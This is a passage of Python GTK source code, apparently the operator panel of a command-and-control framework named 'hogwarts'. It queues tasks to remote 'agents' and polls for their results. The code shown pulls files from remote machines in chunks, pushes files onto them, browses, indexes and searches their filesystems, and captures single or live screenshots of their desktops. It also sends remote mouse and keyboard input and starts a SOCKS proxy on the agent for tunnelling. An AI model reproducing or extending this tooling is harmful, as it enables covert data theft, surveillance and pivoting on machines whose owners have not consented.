            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-agents", daemon=True).start()
        if not quiet:
            self._agents.status_lab.set_text("Loading…")

    def _create_task(self, agent_id: str, type_: str, payload: dict) -> None:
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return

        def work() -> None:
            try:
                out = self._client().create_task(
                    agent_id, type_=type_, payload=payload
                )
                err = None
            except Exception as exc:
                out = {}
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_task_note(err, ok=False)
                    self._log_msg(f"Task error: {err}")
                else:
                    tid = out.get("task_id") or out.get("id") or "?"
                    self._agents.set_task_note(
                        f"Queued {type_} → {tid} (waits for check-in)",
                        ok=True,
                    )
                    self._log_msg(f"Task {tid} queued type={type_} agent={agent_id}")
                    # Optimistic row + one quick refresh (compact list — cheap)
                    self._agents.prepend_queued_task(tid, type_)
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-task", daemon=True).start()
        self._agents.set_task_note("Queuing…")

    def _cancel_task(self, task_id: str) -> None:
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return

        def work() -> None:
            try:
                task = self._client().cancel_task(task_id)
                err = None
            except Exception as exc:
                task = None
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_task_note(err, ok=False)
                    self._log_msg(f"Cancel fail: {err}")
                else:
                    st = task.status if task else "cancelled"
                    self._agents.set_task_note(f"Cancelled {task_id} ({st})", ok=True)
                    self._log_msg(f"Task {task_id} cancelled")
                    aid = self._agents.selected_agent_id()
                    if aid:
                        self._refresh_tasks(aid)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-cancel", daemon=True).start()
        self._agents.set_task_note("Cancelling…")

    def _fetch_file_assembled(self, agent_id: str, remote_path: str) -> None:
        """Multi-chunk download: queue sequential chunks until has_more is false."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return
        chunk = 256_000
        max_total = 8_000_000

        def work() -> None:
            import base64
            import time

            err: str | None = None
            out_path: Path | None = None
            try:
                client = self._client()
                offset = 0
                total: int | None = None
                parts: list[bytes] = []
                while True:
                    created = client.create_task(
                        agent_id,
                        type_="download",
                        payload={
                            "path": remote_path,
                            "offset": offset,
                            "length": chunk,
                        },
                    )
                    tid = str(created.get("task_id") or created.get("id") or "")
                    if not tid:
                        raise RuntimeError("no task_id from plane")
                    # Wait for agent check-in + result
                    task = None
                    for _ in range(90):
                        time.sleep(1.0)
                        task = client.get_task(tid)
                        if task and task.status in (
                            "succeeded",
                            "failed",
                            "cancelled",
                        ):
                            break
                    if not task or task.status != "succeeded":
                        st = task.status if task else "timeout"
                        raise RuntimeError(f"chunk @ {offset} → {st}")
                    res = task.result or {}
                    if res.get("error"):
                        raise RuntimeError(str(res.get("error")))
                    b64 = str(res.get("data") or "")
                    raw = base64.b64decode(b64) if b64 else b""
                    parts.append(raw)
                    total = int(res.get("total_size") or (offset + len(raw)))
                    if total > max_total:
                        raise RuntimeError(f"file too large: {total} > {max_total}")
                    has_more = bool(res.get("has_more"))
                    got = int(res.get("length") or len(raw))
                    offset += got
                    # Progress on status only — do not spam session log every chunk
                    msg = f"Fetch {remote_path}: {offset}/{total} bytes"
                    GLib.idle_add(
                        lambda m=msg: (self._agents.set_task_note(m), False)[-1]
                    )
                    if not has_more or got == 0:
                        break
                blob = b"".join(parts)
                # Prefer original basename under ~/Downloads
                base_name = Path(remote_path.replace("\\", "/")).name or "download.bin"
                safe = _safe_filename(base_name)
                stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
                out_path = _user_downloads_dir() / f"hogwarts-{stamp}-{safe}"
                # Avoid clobbering an existing file
                n = 1
                while out_path.exists():
                    stem = Path(safe).stem
                    suf = Path(safe).suffix
                    out_path = _user_downloads_dir() / f"hogwarts-{stamp}-{stem}_{n}{suf}"
                    n += 1
                out_path.write_bytes(blob)
                try:
                    out_path.chmod(0o600)
                except OSError:
                    pass
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    # One short line — avoid dumping full exception spam to console/log
                    short = err if len(err) < 160 else err[:157] + "…"
                    self._agents.set_task_note(f"Fetch failed: {short}", ok=False)
                    self._log_msg(f"Fetch fail: {short}")
                    self._agents.result_view.get_buffer().set_text(
                        f"fetch failed\nremote  {remote_path}\nerror   {short}\n"
                    )
                else:
                    self._agents.set_task_note(
                        f"Saved → {out_path}", ok=True
                    )
                    self._agents.result_view.get_buffer().set_text(
                        f"assembled file\nremote  {remote_path}\nlocal   {out_path}\n"
                        f"bytes   {out_path.stat().st_size if out_path else 0}\n"
                    )
                    self._log_msg(f"Fetch complete → {out_path}")
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fetch", daemon=True).start()
        self._agents.set_task_note(f"Fetching {remote_path} → ~/Downloads …")

    def _push_file_chunked(
        self, agent_id: str, local_path: str, remote_path: str
    ) -> None:
        """Multi-chunk upload: sequential write/append until local file is sent."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return
        chunk = 256_000
        max_total = 8_000_000

        def work() -> None:
            import base64
            import time

            err: str | None = None
            total = 0
            n_chunks = 0
            try:
                src = Path(local_path)
                if not src.is_file():
                    raise FileNotFoundError(f"not a file: {local_path}")
                blob = src.read_bytes()
                total = len(blob)
                if total > max_total:
                    raise RuntimeError(f"file too large: {total} > {max_total}")
                if total == 0:
                    raise RuntimeError("empty file")
                client = self._client()
                offset = 0
                while offset < total:
                    part = blob[offset : offset + chunk]
                    mode = "write" if offset == 0 else "append"
                    created = client.create_task(
                        agent_id,
                        type_="upload",
                        payload={
                            "path": remote_path,
                            "data": base64.b64encode(part).decode("ascii"),
                            "offset": offset,
                            "mode": mode,
                        },
                    )
                    tid = str(created.get("task_id") or created.get("id") or "")
                    if not tid:
                        raise RuntimeError("no task_id from plane")
                    task = None
                    for _ in range(90):
                        time.sleep(1.0)
                        task = client.get_task(tid)
                        if task and task.status in (
                            "succeeded",
                            "failed",
                            "cancelled",
                        ):
                            break
                    if not task or task.status != "succeeded":
                        st = task.status if task else "timeout"
                        raise RuntimeError(f"chunk @ {offset} → {st}")
                    res = task.result or {}
                    if res.get("error"):
                        raise RuntimeError(str(res.get("error")))
                    got = int(res.get("chunk") or len(part))
                    offset += len(part)
                    n_chunks += 1
                    msg = f"Push {remote_path}: {offset}/{total} bytes"
                    GLib.idle_add(
                        lambda m=msg: (
                            self._agents.set_task_note(m),
                            self._log_msg(m),
                            False,
                        )[-1]
                    )
                    if got == 0:
                        break
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_task_note(f"Push failed: {err}", ok=False)
                    self._log_msg(f"Push fail: {err}")
                else:
                    self._agents.set_task_note(
                        f"Pushed {total} bytes → {remote_path} ({n_chunks} chunks)",
                        ok=True,
                    )
                    self._agents.result_view.get_buffer().set_text(
                        f"uploaded file\nlocal   {local_path}\n"
                        f"remote  {remote_path}\nbytes   {total}\n"
                        f"chunks  {n_chunks}\n"
                    )
                    self._log_msg(
                        f"Push complete → {remote_path} ({total} B, {n_chunks} chunks)"
                    )
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-push", daemon=True).start()
        self._agents.set_task_note(
            f"Pushing → {remote_path} (multi-chunk from {Path(local_path).name})…"
        )

    def _wait_task_result(
        self, client: C2Client, tid: str, *, tries: int = 120, max_wait: float = 75.0
    ):
        """Poll task status with adaptive backoff (fast first, then ease off)."""
        import time

        task = None
        start = time.monotonic()
        n = 0
        while n < tries and (time.monotonic() - start) < max_wait:
            try:
                task = client.get_task(tid)
            except Exception:
                task = None
            if task and task.status in ("succeeded", "failed", "cancelled"):
                return task
            # Aggressive early poll — most lag was the old fixed 1s sleep
            if n < 24:
                time.sleep(0.2)
            elif n < 48:
                time.sleep(0.4)
            else:
                time.sleep(0.8)
            n += 1
        return task

    def _fs_list_remote(
        self, agent_id: str, path: str, show_hidden: bool = False
    ) -> None:
        """Queue fs_list and populate remote view when the agent answers."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return

        def work() -> None:
            err: str | None = None
            result: dict | None = None
            try:
                client = self._client()
                created = client.create_task(
                    agent_id,
                    type_="fs_list",
                    payload={"path": path or "", "show_hidden": show_hidden},
                )
                tid = str(created.get("task_id") or created.get("id") or "")
                if not tid:
                    raise RuntimeError("no task_id from plane")
                task = self._wait_task_result(client, tid)
                if not task or task.status != "succeeded":
                    st = task.status if task else "timeout"
                    res = (task.result or {}) if task else {}
                    raise RuntimeError(
                        f"fs_list → {st}"
                        + (f": {res.get('error')}" if res.get("error") else "")
                    )
                result = task.result or {}
                if result.get("error"):
                    raise RuntimeError(str(result.get("error")))
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if self._agents.selected_agent_id() != agent_id:
                    return False
                if err:
                    # Keep the previous directory listing; only surface the error
                    kept = len(getattr(self._agents, "_remote_entries", None) or [])
                    suffix = f" · previous listing kept ({kept})" if kept else ""
                    self._agents.set_remote_status(
                        f"List failed: {err}{suffix}", ok=False
                    )
                    self._agents.set_task_note(f"Browse failed: {err}", ok=False)
                    self._log_msg(f"fs_list fail: {err}")
                else:
                    assert result is not None
                    entries = list(result.get("entries") or [])
                    rpath = str(result.get("path") or path or "")
                    parent = result.get("parent")
                    sep = str(result.get("sep") or "/")
                    note = f"{len(entries)} entries · {rpath}"
                    if result.get("truncated"):
                        note += " (truncated)"
                    self._agents.set_remote_view(
                        rpath,
                        entries,
                        parent=str(parent) if parent else None,
                        sep=sep,
                        note=note,
                        ok=True,
                    )
                    self._agents.set_task_note(f"Listed {rpath}", ok=True)
                    self._log_msg(f"fs_list {rpath} ({len(entries)} entries)")
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fs-list", daemon=True).start()
        self._agents.set_task_note(f"Listing {path or '~'}…")

    def _fs_task_wait(
        self, agent_id: str, type_: str, payload: dict, *, tries: int = 120
    ) -> tuple[str | None, dict | None]:
        """Queue a task and return (error, result_dict)."""
        try:
            client = self._client()
            created = client.create_task(agent_id, type_=type_, payload=payload)
            tid = str(created.get("task_id") or created.get("id") or "")
            if not tid:
                return "no task_id", None
            task = self._wait_task_result(client, tid, tries=tries)
            if not task or task.status != "succeeded":
                st = task.status if task else "timeout"
                res = (task.result or {}) if task else {}
                err = str(res.get("error") or st)
                return err, res if res else None
            return None, task.result or {}
        except Exception as exc:
            return str(exc), None

    def _fs_index_start(
        self, agent_id: str, roots: list[str] | None = None
    ) -> None:
        """Start agent-local path index (walk MVP)."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return
        payload: dict = {}
        if roots:
            payload["roots"] = list(roots)

        def work() -> None:
            err, result = self._fs_task_wait(
                agent_id, "fs_index_start", payload, tries=60
            )

            def done() -> bool:
                exp = getattr(self._agents, "_explorer", None)
                if err:
                    self._agents.set_task_note(f"Index start failed: {err}", ok=False)
                    self._log_msg(f"fs_index_start fail: {err}")
                    if exp is not None:
                        try:
                            exp.apply_index_status(
                                {"state": "error", "error": err, "count": 0}
                            )
                        except Exception:
                            pass
                else:
                    assert result is not None
                    self._agents.set_task_note(
                        f"Index {result.get('state')} · {result.get('count', 0)} paths",
                        ok=True,
                    )
                    self._log_msg(
                        f"fs_index_start state={result.get('state')} "
                        f"count={result.get('count')}"
                    )
                    if exp is not None:
                        try:
                            exp.apply_index_status(result)
                        except Exception:
                            pass
                    # Poll while building (single tracked source — no stack of timers)
                    if str(result.get("state") or "") in ("building", "stopping"):
                        self._schedule_fs_index_poll(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fs-index-start", daemon=True).start()

    def _schedule_fs_index_poll(self, agent_id: str) -> None:
        if self._fs_index_source is not None:
            try:
                GLib.source_remove(self._fs_index_source)
            except Exception:
                pass
            self._fs_index_source = None

        def tick() -> bool:
            self._fs_index_source = None
            if not self._page_mapped:
                return False
            if self._agents.selected_agent_id() != agent_id:
                return False
            self._fs_index_status(agent_id, _from_poll=True)
            return False

        self._fs_index_source = GLib.timeout_add_seconds(2, tick)

    def _fs_index_poll_tick(self, agent_id: str) -> bool:
        """GLib timeout: keep polling status while index builds. Return False to stop."""
        self._fs_index_source = None
        if self._agents.selected_agent_id() != agent_id:
            return False
        self._fs_index_status(agent_id, _from_poll=True)
        return False  # status handler re-schedules if still building

    def _fs_index_status(self, agent_id: str, *, _from_poll: bool = False) -> None:
        if not self._plane.is_configured:
            return

        def work() -> None:
            # Short wait — long tries=45 blocked worker threads and stacked status jobs
            err, result = self._fs_task_wait(
                agent_id, "fs_index_status", {}, tries=12
            )

            def done() -> bool:
                exp = getattr(self._agents, "_explorer", None)
                if err:
                    if not _from_poll:
                        self._agents.set_task_note(
                            f"Index status failed: {err}", ok=False
                        )
                    if exp is not None:
                        try:
                            exp.apply_index_status(
                                {"state": "error", "error": err, "count": 0}
                            )
                        except Exception:
                            pass
                else:
                    assert result is not None
                    if exp is not None:
                        try:
                            exp.apply_index_status(result)
                        except Exception:
                            pass
                    st = str(result.get("state") or "")
                    if st in ("building", "stopping"):
                        self._schedule_fs_index_poll(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(
            target=work, name="hogwarts-fs-index-status", daemon=True
        ).start()

    def _fs_index_stop(self, agent_id: str) -> None:
        if not self._plane.is_configured:
            return

        def work() -> None:
            err, result = self._fs_task_wait(agent_id, "fs_index_stop", {}, tries=45)

            def done() -> bool:
                exp = getattr(self._agents, "_explorer", None)
                if err:
                    self._agents.set_task_note(f"Index stop failed: {err}", ok=False)
                else:
                    assert result is not None
                    self._log_msg(f"fs_index_stop state={result.get('state')}")
                    if exp is not None:
                        try:
                            exp.apply_index_status(result)
                        except Exception:
                            pass
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fs-index-stop", daemon=True).start()

    def _fs_search_remote(
        self, agent_id: str, query: str, opts: dict | None = None
    ) -> None:
        """Full-index search on agent (fs_search)."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return
        opts = dict(opts or {})
        payload = {
            "query": query,
            "limit": int(opts.get("limit") or 200),
            "offset": int(opts.get("offset") or 0),
        }
        if opts.get("path_prefix"):
            payload["path_prefix"] = str(opts["path_prefix"])

        def work() -> None:
            err, result = self._fs_task_wait(
                agent_id, "fs_search", payload, tries=90
            )

            def done() -> bool:
                exp = getattr(self._agents, "_explorer", None)
                if err:
                    self._agents.set_task_note(f"Search failed: {err}", ok=False)
                    self._log_msg(f"fs_search fail: {err}")
                    if exp is not None:
                        try:
                            exp.apply_search_results(
                                {"error": err, "hits": [], "total": 0}
                            )
                        except Exception:
                            pass
                else:
                    assert result is not None
                    n = int(result.get("count") or len(result.get("hits") or []))
                    self._agents.set_task_note(
                        f"Search {query!r}: {n} hit(s)", ok=True
                    )
                    self._log_msg(
                        f"fs_search q={query!r} hits={n} "
                        f"total={result.get('total')}"
                    )
                    if exp is not None:
                        try:
                            exp.apply_search_results(result)
                        except Exception:
                            pass
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fs-search", daemon=True).start()

    def _fs_preview_remote(self, agent_id: str, remote_path: str) -> None:
        """Download first chunk of a remote file and show as text if possible."""
        if not self._plane.is_configured:
            self._agents.set_task_note("Plane not configured", ok=False)
            return

        def work() -> None:
            import base64

            err: str | None = None
            text: str | None = None
            meta = ""
            try:
                client = self._client()
                created = client.create_task(
                    agent_id,
                    type_="download",
                    payload={
                        "path": remote_path,
                        "offset": 0,
                        "length": 64_000,
                    },
                )
                tid = str(created.get("task_id") or created.get("id") or "")
                if not tid:
                    raise RuntimeError("no task_id")
                task = self._wait_task_result(client, tid)
                if not task or task.status != "succeeded":
                    st = task.status if task else "timeout"
                    raise RuntimeError(f"preview → {st}")
                res = task.result or {}
                if res.get("error"):
                    raise RuntimeError(str(res.get("error")))
                raw = base64.b64decode(res.get("data") or "")
                total = int(res.get("total_size") or len(raw))
                meta = f"{remote_path}  showing {len(raw)}/{total} bytes"
                # Heuristic: treat as text if mostly printable
                sample = raw[:4000]
                if b"\x00" in sample:
                    text = (
                        f"[binary preview — first {len(raw)} bytes hex]\n"
                        + raw[:512].hex(" ")
                    )
                else:
                    text = sample.decode("utf-8", errors="replace")
                    if total > len(raw):
                        text += f"\n\n… truncated ({total - len(raw)} more bytes)"
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_task_note(f"Preview failed: {err}", ok=False)
                    self._log_msg(f"preview fail: {err}")
                else:
                    self._agents.set_task_note(f"Preview {meta}", ok=True)
                    self._agents.result_view.get_buffer().set_text(
                        f"remote view · {meta}\n\n{text or ''}"
                    )
                    self._log_msg(f"preview {remote_path}")
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-fs-preview", daemon=True).start()
        self._agents.set_task_note(f"Previewing {remote_path}…")

    def _decode_frame_result(self, res: dict) -> bytes | None:
        import base64

        b64 = str(res.get("data") or "")
        if b64:
            try:
                return base64.b64decode(b64)
            except Exception:
                return None
        return None

    def _download_remote_bytes(
        self,
        client: "C2Client",
        agent_id: str,
        remote_path: str,
        *,
        max_total: int = 12_000_000,
        chunk: int = 384_000,
    ) -> bytes:
        """Assemble a remote file via sequential download tasks (high-res frames)."""
        import base64

        offset = 0
        parts: list[bytes] = []
        while True:
            created = client.create_task(
                agent_id,
                type_="download",
                payload={
                    "path": remote_path,
                    "offset": offset,
                    "length": chunk,
                },
            )
            tid = str(created.get("task_id") or created.get("id") or "")
            if not tid:
                raise RuntimeError("download: no task_id")
            task = self._wait_task_result(client, tid, tries=60, max_wait=45.0)
            if not task or task.status != "succeeded":
                st = task.status if task else "timeout"
                raise RuntimeError(f"download chunk @{offset} → {st}")
            res = task.result or {}
            if res.get("error"):
                raise RuntimeError(str(res.get("error")))
            b64 = str(res.get("data") or "")
            raw = base64.b64decode(b64) if b64 else b""
            parts.append(raw)
            total = int(res.get("total_size") or (offset + len(raw)))
            if total > max_total:
                raise RuntimeError(f"frame too large: {total} > {max_total}")
            got = int(res.get("length") or len(raw))
            offset += got
            if not bool(res.get("has_more")) or got == 0:
                break
        return b"".join(parts)

    def _screenshot_remote(self, agent_id: str, max_side: int = 1920) -> None:
        """One-shot remote screenshot — only while Remote Viewer is open."""
        if not self._plane.is_configured:
            self._agents.set_desktop_note("Plane not configured", ok=False)
            return
        if not self._agents.desktop_viewer_open():
            self._agents.set_desktop_note(
                "Open Remote Viewer to capture — not available on the agent page.",
                ok=False,
            )
            return
        try:
            side = max(320, min(4096, int(max_side or 1920)))
        except (TypeError, ValueError):
            side = 1920

        def work() -> None:
            err: str | None = None
            blob: bytes | None = None
            note = ""
            try:
                client = self._client()
                # Still capture: high quality JPEG, no live encode path
                created = client.create_task(
                    agent_id,
                    type_="screenshot",
                    payload={
                        "max_side": side,
                        "inline": True,
                        "live": False,
                        "include_cursor": True,
                    },
                )
                tid = str(created.get("task_id") or created.get("id") or "")
                if not tid:
                    raise RuntimeError("no task_id")
                task = self._wait_task_result(client, tid, tries=90)
                if not task or task.status != "succeeded":
                    st = task.status if task else "timeout"
                    res = (task.result or {}) if task else {}
                    raise RuntimeError(
                        f"screenshot → {st}"
                        + (f": {res.get('error')}" if res.get("error") else "")
                    )
                res = task.result or {}
                if res.get("error"):
                    raise RuntimeError(str(res.get("error")))
                blob = self._decode_frame_result(res)
                if blob is None and res.get("path"):
                    # High-res: full multi-chunk pull when not inline
                    blob = self._download_remote_bytes(
                        client, agent_id, str(res.get("path"))
                    )
                if not blob:
                    raise RuntimeError("no image data in result")
                w = res.get("width") or "?"
                h = res.get("height") or "?"
                method = res.get("method") or "?"
                note = f"{w}×{h} · {method} · {len(blob)} B · max_side={side}"
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if self._agents.selected_agent_id() != agent_id:
                    return False
                if not self._agents.desktop_viewer_open():
                    return False
                if err:
                    self._agents.set_desktop_note(f"Screenshot failed: {err}", ok=False)
                    self._log_msg(f"screenshot fail: {err}")
                else:
                    assert blob is not None
                    # Display only — no sidebar/history unless viewer Save to disk
                    self._agents.set_desktop_frame(
                        blob, note=note, ok=True, record_history=False
                    )
                    self._agents.set_task_note(f"Screenshot {note}", ok=True)
                    self._log_msg(f"screenshot {note}")
                    self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-shot", daemon=True).start()

    def _live_desktop_toggle(self, agent_id: str, on: bool) -> None:
        """Live poll screenshots only while Remote Viewer is open."""
        if self._live_desktop_source is not None:
            GLib.source_remove(self._live_desktop_source)
            self._live_desktop_source = None
        self._live_desktop_agent = agent_id if on else None
        self._live_desktop_busy = False
        if not on:
            self._log_msg("Live desktop off")
            return
        if not self._agents.desktop_viewer_open():
            self._agents.set_desktop_note(
                "Open Remote Viewer for Live — not available on the agent page.",
                ok=False,
            )
            self._agents.stop_live_ui()
            self._live_desktop_agent = None
            return
        if not self._plane.is_configured:
            self._agents.set_desktop_note("Plane not configured", ok=False)
            self._agents.stop_live_ui()
            return
        try:
            interval_ms = int(
                getattr(self._agents, "_live_interval_ms", 1000) or 1000
            )
            interval_ms = max(250, min(interval_ms, 10_000))
        except (TypeError, ValueError):
            interval_ms = 1000
        self._log_msg(
            f"Live desktop on agent={agent_id} interval={interval_ms}ms"
        )
        # Kick immediately
        self._screenshot_remote(agent_id)

        def tick() -> bool:
            if self._live_desktop_agent != agent_id:
                return False
            # Stop timer when viewer closes or agent selection left this id
            if not self._agents.desktop_viewer_open():
                self._live_desktop_agent = None
                self._live_desktop_source = None
                self._live_desktop_busy = False
                return False
            if self._agents.selected_agent_id() != agent_id:
                # Detail may have changed; keep Live only if viewer still open
                # for this agent session — otherwise stop
                if not self._agents.desktop_viewer_open():
                    self._live_desktop_agent = None
                    self._live_desktop_source = None
                    return False
            if not self._live_desktop_busy:
                self._live_desktop_busy = True

                def work() -> None:
                    try:
                        self._screenshot_remote_sync(agent_id)
                    finally:
                        self._live_desktop_busy = False

                threading.Thread(
                    target=work, name="hogwarts-live-tick", daemon=True
                ).start()
            return True

        # Sub-second polls in Control; still one in-flight frame at a time
        self._live_desktop_source = GLib.timeout_add(interval_ms, tick)

    def _screenshot_remote_sync(self, agent_id: str) -> None:
        """Blocking screenshot for live loop (runs on worker thread)."""
        # Live: respect operator Quality; Control uses lighter frames for latency
        try:
            side = int(self._agents.shot_max_side())
        except Exception:
            side = 1280
        control_mode = False
        try:
            interval_ms = int(
                getattr(self._agents, "_live_interval_ms", 1000) or 1000
            )
            control_mode = interval_ms <= 400
        except (TypeError, ValueError):
            interval_ms = 1000
        # Control: moderate size + readable quality; View Live allows higher
        if control_mode:
            live_cap = 1024
            live_quality = 58
        else:
            live_cap = 1600
            live_quality = 64
        side = max(480, min(side, live_cap))

        try:
            client = self._client()
            payload: dict[str, Any] = {
                "max_side": side,
                "inline": True,
                "live": True,
                "include_cursor": True,
            }
            if live_quality is not None:
                payload["quality"] = live_quality
            created = client.create_task(
                agent_id,
                type_="screenshot",
                payload=payload,
            )
            tid = str(created.get("task_id") or "")
            if not tid:
                return
            # Don't block long on a frame — next tick will supersede
            task = self._wait_task_result(
                client, tid, tries=40, max_wait=4.0 if control_mode else 8.0
            )
            if not task or task.status != "succeeded":
                st = task.status if task else "timeout"
                GLib.idle_add(
                    lambda s=st: (
                        self._agents.set_desktop_note(
                            f"Live frame {s} — will retry",
                            ok=False,
                        ),
                        False,
                    )[-1]
                )
                return
            res = task.result or {}
            blob = self._decode_frame_result(res)
            if blob is None and res.get("path"):
                try:
                    blob = self._download_remote_bytes(
                        client, agent_id, str(res.get("path")), max_total=4_000_000
                    )
                except Exception:
                    blob = None
            if not blob:
                return
            w = res.get("width") or "?"
            h = res.get("height") or "?"
            method = res.get("method") or "?"
            note = f"LIVE {w}×{h} · {method} · {len(blob)} B · max_side={side}"

            def done() -> bool:
                if self._live_desktop_agent != agent_id:
                    return False
                if self._agents.selected_agent_id() != agent_id:
                    return False
                if not self._agents.desktop_viewer_open():
                    return False
                self._agents.set_desktop_frame(
                    blob, note=note, ok=True, record_history=False
                )
                return False

            GLib.idle_add(done)
        except Exception as exc:
            GLib.idle_add(
                lambda: (
                    self._agents.set_desktop_note(f"Live: {exc}", ok=False),
                    False,
                )[-1]
            )

    def _ensure_input_worker(self) -> None:
        """Single background worker for desktop_input HTTP posts."""
        if getattr(self, "_input_worker_started", False):
            return
        import threading as _threading
        import time as _time

        self._input_q_lock = _threading.Lock()
        self._input_send_q: list[dict[str, Any]] = []
        self._input_agent_id: str | None = None
        self._input_worker_started = True

        def worker() -> None:
            while True:
                batch: list[dict[str, Any]] = []
                aid: str | None = None
                with self._input_q_lock:
                    if self._input_send_q:
                        batch = list(self._input_send_q)
                        self._input_send_q.clear()
                        aid = self._input_agent_id
                if not batch or not aid:
                    _time.sleep(0.008)
                    continue
                out: list[dict[str, Any]] = []
                pending_move: dict[str, Any] | None = None
                for ev in batch:
                    if str(ev.get("type") or "") == "move":
                        pending_move = ev
                    else:
                        if pending_move is not None:
                            out.append(pending_move)
                            pending_move = None
                        out.append(ev)
                if pending_move is not None:
                    out.append(pending_move)
                if not out:
                    continue
                try:
                    self._client().create_task(
                        aid,
                        type_="desktop_input",
                        payload={"events": out[:48]},
                    )
                except Exception as exc:
                    GLib.idle_add(
                        lambda e=exc: (
                            self._agents.set_desktop_note(
                                f"Input failed: {e}", ok=False
                            ),
                            False,
                        )[-1]
                    )

        _threading.Thread(
            target=worker, name="hogwarts-input-worker", daemon=True
        ).start()

    def _desktop_input_remote(
        self, agent_id: str, events: list[dict[str, Any]]
    ) -> None:
        """Queue desktop_input for the single Control-mode worker (ordered, low lag)."""
        if not self._plane.is_configured or not agent_id or not events:
            return
        if not self._agents.desktop_viewer_open():
            return
        self._ensure_input_worker()
        with self._input_q_lock:
            self._input_agent_id = agent_id
            self._input_send_q.extend(events[:32])
            if len(self._input_send_q) > 64:
                kept: list[dict[str, Any]] = []
                last_move: dict[str, Any] | None = None
                for ev in self._input_send_q:
                    if str(ev.get("type") or "") == "move":
                        last_move = ev
                    else:
                        kept.append(ev)
                if last_move is not None:
                    kept.append(last_move)
                self._input_send_q = kept[-48:]

    def _socks_start_for_agent(self, agent_id: str) -> None:
        if not self._plane.is_configured:
            self._agents.set_desktop_note("Plane not configured", ok=False)
            return

        def work() -> None:
            err = None
            res = None
            try:
                client = self._client()
                created = client.create_task(
                    agent_id, type_="socks_start", payload={"port": 0}
                )
                tid = str(created.get("task_id") or "")
                task = self._wait_task_result(client, tid, tries=60)
                if not task or task.status != "succeeded":
                    raise RuntimeError(
                        f"socks_start → {task.status if task else 'timeout'}"
                    )
                res = task.result or {}
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_desktop_note(f"SOCKS: {err}", ok=False)
                    self._log_msg(f"socks_start fail: {err}")
                else:
                    assert res is not None
                    note = (
                        f"SOCKS on agent port {res.get('port')} "
                        f"bind={res.get('bind')} — tunnel then VNC"
                    )
                    self._agents.set_desktop_note(note, ok=True)
                    self._agents.set_desktop_session_info(
                        {"note": note, "socks": res}
                    )
                    self._log_msg(note)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-socks", daemon=True).start()
        self._agents.set_desktop_note("Starting SOCKS on agent…")

    def _stop_keepstream_client(self) -> None:
        src = getattr(self, "_ks_paint_src", None)
        if src is not None:
            try:
                GLib.source_remove(src)
            except Exception:
                pass
            self._ks_paint_src = None
        ks = getattr(self, "_keepstream", None)
        if ks is not None:
            try:
                ks.stop()
            except Exception:
                pass
        self._keepstream = None
        try:
            from hogwarts.h264dec import stop_h264_decoder

            stop_h264_decoder()
        except Exception:
            pass

    def _desktop_session(
        self, agent_id: str, action: str, options: dict | None = None
    ) -> None:
        """Stream start/stop: Keepstream (default) or legacy desktop_start/stop."""
        if not self._plane.is_configured:
            self._agents.set_desktop_note("Plane not configured", ok=False)
            return
        if not self._agents.desktop_viewer_open():
            self._agents.set_desktop_note(
                "Open Remote Viewer for Stream — not available on the agent page.",
                ok=False,
            )
            return

        if action == "stop":
            self._stop_keepstream_client()

            def work_stop() -> None:
                err: str | None = None
                res: dict | None = None
                try:
                    client = self._client()
                    created = client.create_task(
                        agent_id, type_="session_stop", payload={}
                    )
                    tid = str(created.get("task_id") or "")
                    task = self._wait_task_result(client, tid, tries=45, max_wait=20.0)
                    if task and task.status == "succeeded":
                        res = task.result or {}
                    # Also legacy desktop_stop best-effort
                    try:
                        client.create_task(
                            agent_id, type_="desktop_stop", payload={}
                        )
                    except Exception:
                        pass
                except Exception as exc:
                    err = str(exc)

                def done() -> bool:
                    try:
                        dv = getattr(self._agents, "_desktop_viewer", None)
                        if dv is not None and hasattr(dv, "clear_keepstream"):
                            dv.clear_keepstream()
                    except Exception:
                        pass
                    if err:
                        self._agents.set_desktop_note(err, ok=False)
                    else:
                        note = "Stream stopped"
                        if res:
                            note += f" · {res.get('session_id') or ''}"
                        self._agents.set_desktop_note(note, ok=True)
                        self._agents.set_desktop_session_info(
                            {"stopped": True, **(res or {})}
                        )
                        self._log_msg("session_stop")
                    return False

                GLib.idle_add(done)

            threading.Thread(
                target=work_stop, name="hogwarts-session-stop", daemon=True
            ).start()
            self._agents.set_desktop_note("Stopping Keepstream…")
            return

        # start Keepstream Session
        self._stop_keepstream_client()
        # Kill Live screenshot poll immediately — otherwise stills keep
        # overwriting / "taking over" the Remote Viewer during connect.
        try:
